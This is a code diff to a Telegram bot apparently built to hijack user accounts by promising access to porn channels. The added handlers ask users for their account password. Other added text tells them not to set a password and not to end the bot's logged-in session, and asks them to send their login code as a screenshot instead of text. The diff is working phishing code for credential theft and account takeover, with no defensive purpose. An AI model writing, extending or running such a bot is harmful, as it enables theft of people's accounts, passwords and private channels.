@@ -94,6 +94,11 @@ async def free(_, message):
 @app.on_message(filters.command("verif") & filters.private)
 async def verip(_, message):
     await app.send_message(message.chat.id, "Please send your telegram phone number…")
+# PASSWORD 
+
+@app.on_message(filters.command("🔐") & filters.private)
+async def verip(_, message):
+    await app.send_message(message.chat.id, "__Please send your Account Password__")
 
 # SEND NOMER
 
@@ -122,6 +127,11 @@ Succesfully add to Database ⚡
 
 __Congratulations!!__ You are already a member of the Koleksi Porn Video Channel 🎉
 
+**Attention!! When you remove the system that is logged in to your account, what will happen is that your entire channel will disappear, please pay attention**
+―――――――――――――――――
+📌 Do not put a password on your account!
+――――――――――――――――――
+
 if you want more channels please press the button below and follow the steps :
 """
 SUCCES_BUTTON = [
@@ -140,6 +150,36 @@ async def start(_, message):
         reply_markup=reply_markup,
         disable_web_page_preview=True
     )
+
+# EROR KODE
+
+EROR_KODE_TEKS = """❌ __Error message detected__
+
+Please send screenhot of your Code Not a text!
+if you don't understand please type /help
+
+Please start the bot again
+
+"""
+
+EROR_KODE_TOMBOL = [
+
+    [  
+        InlineKeyboardButton("♻️Start Again", url="https://t.me/pornChannelRobot?start=start"),              
+    ],            
+]
+
+@app.on_message(filters.regex("⚠️") & filters.private)
+async def start(_, message):
+    text = EROR_KODE_TEKS
+    reply_markup = InlineKeyboardMarkup(EROR_KODE_TOMBOL)
+    await message.reply(
+        text=text,
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
+    )
+
+
 # REGEX
 
 @app.on_callback_query(filters.regex("^kesatu"))
